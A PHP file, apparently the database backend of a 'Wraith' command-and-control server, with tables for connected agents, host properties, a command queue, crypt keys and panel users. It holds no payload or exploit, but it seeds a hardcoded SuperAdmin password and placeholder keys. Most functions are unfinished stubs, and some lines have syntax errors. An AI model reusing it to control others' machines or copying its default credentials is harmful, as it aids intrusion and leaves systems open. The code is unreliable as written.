<?php

// SQLite database file location relative to API.php
$DATABASE_LOCATION = "./storage/wraithdb";

// Get a database instance
// This can be edited to use MySQL or equivalent databases. As long as
// there is a $db variable holding a PDO database connection
// all should work (untested).
$GLOBALS["db"] = new PDO("sqlite:" . $DATABASE_LOCATION);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Check whether the database is initialised
try {

    $db->query("SELECT * FROM DB_INIT_INDICATOR")->fetchAll();

} catch (PDOException $e) {

    // If not, prepare the database

    // SQL Commands to be executed to initialise the database
    $db_init_commands = [
        // Settings table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Settings` (
            `Key` TEXT,
            `Value` TEXT
        );",
        // Statistics table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Stats` (
            `Key` TEXT,
            `Value` TEXT
        );",
        // Connected Wraiths table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_ActiveWraiths` (
            `AssignedID` TEXT,
            `HostProperties` TEXT,
            `WraithProperties` TEXT,
            `LastHeartbeatTime` TEXT,
            `IssuedCommands` TEXT
        );",
        // Command queue table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_CommandsIssued` (
            `CommandID` TEXT,
            `CommandName` TEXT,
            `CommandParams` TEXT,
            `CommandTargets` TEXT,
            `CommandResponses` TEXT,
            `TimeIssued` TEXT
        );",
        // Users table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Users` (
            `UserID` INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
            `UserName` TEXT,
            `UserPassword` TEXT,
            `UserPrivileges` TEXT
        );",
        // Users table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Sessions` (
            `SessionToken` TEXT,
            `UserID` INTEGER,
            `LastSessionHeartbeat` TEXT
        );",
        // Create default settings entries
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'WraithMarkOfflineDelay',
            '16'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'WraithInitialCryptKey',
            'QWERTYUIOPASDFGHJKLZXCVBNM'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'WraithSwitchCryptKey',
            'QWERTYUIOPASDFGHJKLZXCVBNM'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'PanelSessionExpiryDelay',
            '10'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'APIFingerprint',
            'ABCDEFGHIJKLMNOP'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'DefaultCommand',
            ''
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'APIPrefix',
            'W_'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'RequestIPBlacklist',
            '" . json_encode([]) . "'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'ManagementAuthCode',
            ''
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'ManagementIPWhitelist',
            '[]'
        );",
        // Create a stats table entry
        "INSERT INTO `WraithAPI_Stats` VALUES (
            'DatabaseSetupAPIVersion',
            '" . API_VERSION . "'
        );",
        // Create a stats table entry
        "INSERT INTO `WraithAPI_Stats` VALUES (
            'DatabaseSetupTime',
            '" . time() . "'
        );",
        // Mark the database as initialised
        "CREATE TABLE IF NOT EXISTS `DB_INIT_INDICATOR` (
            `DB_INIT_INDICATOR` INTEGER
        );"
    ]; // TODO: Set default of NoCrypt to 0

    // Execute the SQL queries to initialise the database
    foreach ($db_init_commands as $command) {

        $db->exec($command);

    }

}

// Set the global SETTINGS variable with the settings from the database
$settings_table = $db->query("SELECT * FROM WraithAPI_Settings");
$SETTINGS = [];
foreach ($settings_table as $table_row) {
    $SETTINGS[$table_row[0]] = $table_row[1];
}

// Check whether a user account exists
// There has to be a way to manage the API so if there are no users,
// create one.
try {

    $API_USERS = $db->query("SELECT * FROM WraithAPI_Users")->fetchAll();

    if (sizeof($API_USERS) == 0) {
        throw new Exception("");
    }

} catch (Exception $e) {

    // Create default super admin user

    $user_entry_creation_command = "INSERT INTO `WraithAPI_Users` (
        `UserName`,
        `UserPassword`,
        `UserPrivileges`
    ) VALUES (
        'SuperAdmin',
        '" . password_hash("SuperAdminPassword", PASSWORD_BCRYPT) . "',
        '2'
    );";

    $db->exec($user_entry_creation_command);

}

// Set the global API_USERS variable
$API_USERS = $db->query("SELECT * FROM WraithAPI_Users LIMIT 1")->fetchAll();

// Functions for database management

// WRAITH

// Add a Wraith to the database
function db_add_wraith($wraith) {

    global $db;

    $statement = $db->prepare("INSERT INTO `WraithAPI_ActiveWraiths` (
        `AssignedID`,
        `HostProperties`,
        `WraithProperties`,
        `LastHeartbeatTime`,
        `IssuedCommands`
    ) VALUES (
        :AssignedID,
        :HostProperties,
        :WraithProperties,
        :LastHeartbeatTime,
        :IssuedCommands
    )");

    // Bind the parameters in the query with variables
    $statement->bindParam(":AssignedID", $wraith["AssignedID"]);
    $statement->bindParam(":HostProperties", $wraith["HostProperties"]);
    $statement->bindParam(":WraithProperties", $wraith["WraithProperties"]);
    $statement->bindParam(":LastHeartbeatTime", $wraith["LastHeartbeatTime"]);
    $statement->bindParam(":IssuedCommands", $wraith["IssuedCommands"]);

    // Execute the statement to add a Wraith
    $statement->execute();

}

// Remove Wraith(s)
function db_remove_wraiths($ids) {

    global $db;

    $statement = $db->prepare("DELETE FROM `WraithAPI_ActiveWraiths` WHERE AssignedID == :IDToDelete");

    // Remove each ID
    foreach ($ids as $id) {
        $statement->bindParam(":IDToDelete", $id);
        $statement->execute();
    }

}

// Check which Wraiths have not sent a heartbeat in the mark dead time and remove
// them from the database
function db_expire_wraiths() {

    global $db;

    // Remove all Wraith entries where the last heartbeat time is older than
    // the $SETTINGS["MarkOfflineDelay"]
    $statement = $db->prepare("DELETE FROM `WraithAPI_ActiveWraiths`
        WHERE `LastHeartbeatTime` < :earliest_valid_heartbeat");
    // Get the unix timestamp for $SETTINGS["MarkOfflineDelay"] seconds ago
    $earliest_valid_heartbeat = time()-$SETTINGS["WraithMarkOfflineDelay"];
    $statement->bindParam(":earliest_valid_heartbeat", $earliest_valid_heartbeat);
    // Execute
    $statement->execute();

}

// Get a list of Wraiths and their properties
function db_get_wraiths() {

    global $db;

    // TODO

}

// COMMAND

// Issue a command to Wraith(s)
function db_issue_commands($command) {

    global $db;

    // TODO

}

// Delete command(s) from the command table
function db_cancel_commands($ids) {

    global $db;

    // TODO

}

// Get command(s)
function db_get_commands($ids) {

    global $db;

    // TODO

}

// USERS & SETTINGS

// Edit an API setting
function db_edit_settings($id, $value) {

    global $db;

    // TODO

}

// Create a new user
function db_add_users($userdata) {

    global $db;

    // TODO

}

// Change username
function db_change_user_name($user_id, $new_username) {

    global $db;

    // TODO

}

// Change user password
function db_change_user_pass($user_id, $new_password) {

    global $db;

    // TODO

}

// Change user privilege level (0=User, 1=Admin, 2=SuperAdmin)
function db_change_user_privilege($user_id, $new_privilege_level) {

    global $db;

    // TODO

}

// SESSIONS

// Create a session for a user
function db_create_session($user_id) {

    global $db

    // TODO

}

// Delete a session
function db_destroy_session($user_id) {

    global $db

    // TODO

}

// Delete sessions which have not had a heartbeat recently
function db_expire_sessions() {

    global $db

    // TODO

}

// STATS

// Update a statistic
function db_get_stats($stat_id) {

    global $db;

    // TODO

}

// Update a statistic
function db_update_stats($stat_id, $new_value) {

    global $db;

    // TODO

}
